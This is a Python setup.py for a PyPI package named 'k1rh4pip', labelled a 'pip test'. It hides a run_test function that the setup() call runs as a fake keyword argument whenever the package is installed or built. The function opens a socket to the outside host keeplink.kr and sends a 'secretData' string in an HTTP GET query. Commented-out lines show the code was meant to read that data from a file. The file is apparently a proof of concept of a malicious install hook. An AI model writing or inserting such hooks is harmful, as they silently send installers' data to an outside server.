from setuptools import setup, find_packages
from socket import *
VERSION ="1.8"
#f=open("secretData","r")
secretData="this is secret key"
#f.close()
DATA=VERSION + ":" + secretData
DATA = DATA.replace(" ","_")

def run_test():
    sock = socket(AF_INET,SOCK_STREAM)
    sock.connect(("keeplink.kr".encode(),80))
    #sock.send(str("GET /get.php?r=%s HTTP/1.0\r\n\r\n"%(DATA)).encode())
    sock.send(str(("GET /get.php?r='%s' HTTP/1.0\r\n\r\n"%DATA)).encode())
    sock.close()
    #response = requests.get("http://keeplink.kr/get.php?r='aaaa'")

setup(
    name                = 'k1rh4pip',
    version             = VERSION,
    description         = 'k1rh4 pip test',
    author              = 'k1rh4.lee',
    author_email        = 'k1rha87@gmail.com',
    url                 = 'https://github.com/k1rh4/k1rh4pip',
    download_url        = 'https://github.com/k1rh4/k1rh4pip/archive/master.zip',
    install_requires    =  [],
    packages            = find_packages(exclude = []),
    keywords            = ['pypi k2rh4'],
    long_description=open('README.md').read(),
    python_requires     = '>=3',
    package_data        = {},
    zip_safe            = False,
    k1rh4               = run_test(),
    classifiers         = [
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.2',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
    ],
)
